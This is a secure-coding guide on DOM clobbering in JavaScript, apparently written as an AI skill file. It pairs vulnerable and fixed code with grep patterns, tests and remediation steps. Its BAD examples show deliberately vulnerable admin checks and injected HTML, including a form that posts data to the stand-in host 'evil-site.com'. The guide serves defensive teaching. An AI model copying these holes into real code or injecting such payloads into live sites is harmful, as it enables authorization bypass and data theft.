---
name: "dom-clobbering-anti-pattern"
description: "Security anti-pattern for DOM Clobbering vulnerabilities (CWE-79 variant). Use when generating or reviewing code that accesses DOM elements by ID, uses global variables, or relies on document properties. Detects HTML injection that overwrites JavaScript globals."
---

# DOM Clobbering Anti-Pattern

**Severity:** Medium

## Summary

DOM Clobbering overwrites global JavaScript variables via attacker-controlled HTML. Browsers auto-create global variables from `id` and `name` attributes. Enables logic bypasses, XSS, and security control evasion. Bypasses HTML sanitizers that allow `id` and `name`.

## The Anti-Pattern

Application JavaScript relies on global variables that HTML injection overwrites. Code expects legitimate objects but receives DOM element references instead.

### BAD Code Example

```javascript
// VULNERABLE: Using a global variable that can be clobbered.

// Imagine this HTML is injected into the page by an attacker:
// <div id="appConfig"></div>

// The application code expects `appConfig` to be a configuration object.
// However, `window.appConfig` now points to the <div> element above.
if (window.appConfig.isAdmin) {
    // A DOM element is "truthy", so this check passes.
    // The attacker gains access to the admin panel without being an admin.
    showAdminPanel();
}

// Another example:
// Injected HTML: <form id="someForm" action="https://evil-site.com">
// Legitimate button: <button onclick="submitForm()">Submit</button>

function submitForm() {
    // The code intends to get a legitimate form, but gets the injected one.
    var form = document.getElementById('someForm');
    form.submit(); // Submits data to the attacker's site.
}
```

### GOOD Code Example

```javascript
// SECURE: Avoid global variables and validate DOM elements.

// 1. Use a namespace for your application's objects.
const myApp = {};
myApp.config = {
    isAdmin: false
    // ... other config
};

// Access the configuration through the namespace.
if (myApp.config.isAdmin) {
    showAdminPanel();
}

// 2. Validate the type of element retrieved from the DOM.
function submitForm() {
    var form = document.getElementById('someForm');
    // Check that the element is actually a form before using it.
    if (form instanceof HTMLFormElement) {
        form.submit();
    } else {
        console.error("Error: 'someForm' is not a valid form element.");
    }
}

// 3. Freeze critical objects to prevent modification.
Object.freeze(myApp.config);
```

### React Example

**BAD:**
```jsx
// VULNERABLE: Accessing window global that can be clobbered
function AdminPanel() {
    // Attacker injects: <div id="appConfig"></div>
    // window.appConfig now points to the div, not the config object
    if (window.appConfig?.isAdmin) {
        return <AdminControls />;
    }
    return <AccessDenied />;
}
```

**GOOD:**
```jsx
// SECURE: Use React Context or module scope
import { useContext } from 'react';
import { ConfigContext } from './ConfigContext';

function AdminPanel() {
    const config = useContext(ConfigContext);

    if (config.isAdmin) {
        return <AdminControls />;
    }
    return <AccessDenied />;
}
```

### TypeScript Example

**GOOD:**
```typescript
// Type safety prevents DOM clobbering
interface AppConfig {
    isAdmin: boolean;
    apiUrl: string;
}

// Module-scoped, not global
const appConfig: AppConfig = {
    isAdmin: false,
    apiUrl: '/api'
};

// TypeScript enforces type checking
function checkAdmin(): void {
    // Even if window.appConfig exists, TypeScript requires the interface
    if (appConfig.isAdmin) {  // Type-safe access
        showAdminPanel();
    }
}

// Validate DOM elements with type guards
function submitForm(formId: string): void {
    const elem = document.getElementById(formId);

    if (!(elem instanceof HTMLFormElement)) {
        throw new TypeError(`Element ${formId} is not a form`);
    }

    elem.submit();
}
```

## Detection

**JavaScript Patterns:**
- Global variable access: `window.config`, `document.userInfo`
- Implicit globals: `config.isAdmin` (no var/let/const declaration)
- `document.getElementById()` without type validation
- Security checks on globals: `if (window.auth.isLoggedIn)`

**Search Patterns:**
- Grep: `window\.[a-zA-Z]+\.|\bdocument\.[a-zA-Z]+\.|getElementById\(.*\)\.(?!tag|class)`
- Look for: `if (window.` or `if (document.`
- Check: Direct property access without instanceof check

**HTML Sanitizer Review:**
- DOMPurify: Check `FORBID_ATTR` doesn't exclude `id`, `name`
- Sanitize-html: Review `allowedAttributes` config
- HTML Purifier: Verify attribute whitelist

**Manual Testing:**
1. Identify global variables: Check `window` object in console
2. Inject clobbering HTML: `<div id="globalVarName"></div>`
3. Verify override: `console.log(typeof window.globalVarName)`
4. Test security impact: Try bypassing checks

## Prevention

- [ ] **Avoid using global variables** for security-critical operations or configurations. Instead, use a private namespace (e.g., `const myApp = { config: { ... } };`).
- [ ] **Freeze critical objects** using `Object.freeze()` to make them read-only, preventing them from being overwritten.
- [ ] **Validate the type** of any object retrieved from the DOM before using it (e.g., `if (elem instanceof HTMLFormElement)`).
- [ ] **Use a robust HTML sanitizer**, but be aware that allowing `id` and `name` attributes still leaves you vulnerable. DOM Clobbering protection must be implemented in your JavaScript code.
- [ ] **Use prefixes for element IDs** that are unlikely to collide with global variables (e.g., `id="myapp-user-form"`).

## Testing for DOM Clobbering

**Manual Testing:**
1. **Identify globals:** Open browser console, type `window.` and check autocomplete
2. **Test clobbering:** Inject `<div id="targetGlobal"></div>` via input fields
3. **Verify type change:** `typeof window.targetGlobal` should show object → object (Element)
4. **Test bypass:** Check if security checks fail (admin access, auth bypass)

**Automated Testing:**
- **Static Analysis:** ESLint plugin `eslint-plugin-no-unsanitized`
- **Dynamic Testing:** Burp Suite DOM Clobbering scanner
- **Code Review:** Search for `window.` access patterns
- **Type Checking:** TypeScript strict mode catches many cases

**Example Test:**
```javascript
// Test that critical objects cannot be clobbered
describe('DOM Clobbering Protection', () => {
    it('should prevent config object clobbering', () => {
        // Attempt to clobber
        const div = document.createElement('div');
        div.id = 'appConfig';
        document.body.appendChild(div);

        // Verify original object intact
        expect(typeof myApp.config).toBe('object');
        expect(myApp.config.isAdmin).toBe(false);

        // Cleanup
        document.body.removeChild(div);
    });

    it('should validate form element types', () => {
        // Create fake form
        const div = document.createElement('div');
        div.id = 'loginForm';
        document.body.appendChild(div);

        // Should throw or return false
        expect(() => submitForm('loginForm')).toThrow(TypeError);
    });
});
```

**Browser DevTools Check:**
```javascript
// Run in console to find potential clobbering targets
Object.keys(window).filter(key =>
    typeof window[key] === 'object' &&
    window[key] !== null &&
    !window[key].toString().includes('[native code]')
);
```

## Remediation Steps

1. **Identify global dependencies** - Search for `window.` and implicit globals
2. **Audit HTML sanitizer** - Check if `id` and `name` are allowed
3. **Create namespace** - Move globals to module scope or namespace object
4. **Add type validation** - Check `instanceof` before using DOM elements
5. **Freeze critical objects** - Use `Object.freeze()` on config objects
6. **Update code** - Replace `window.foo` with `myApp.foo`
7. **Test protection** - Verify clobbering attempts fail
8. **Enable TypeScript** - Leverage type safety for additional protection

## Related Security Patterns & Anti-Patterns

- [Cross-Site Scripting (XSS) Anti-Pattern](../xss/): DOM Clobbering can be a vector to enable XSS.
- [Mutation XSS Anti-Pattern](../mutation-xss/): Another sanitizer-bypass technique that abuses the way browsers parse HTML.
- [Missing Input Validation Anti-Pattern](../missing-input-validation/): Failing to validate the type of a DOM element is a form of missing input validation.

## References

- [OWASP Top 10 A05:2025 - Injection](https://owasp.org/Top10/2025/A05_2025-Injection/)
- [OWASP GenAI LLM05:2025 - Improper Output Handling](https://genai.owasp.org/llmrisk/llm05-improper-output-handling/)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [CAPEC-588: DOM-Based XSS](https://capec.mitre.org/data/definitions/588.html)
- [PortSwigger DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [DOM Clobbering Research](https://research.securitum.com/xss-in-chrome-extensions-with-dom-clobbering/)
- Source: [sec-context](https://github.com/Arcanum-Sec/sec-context)
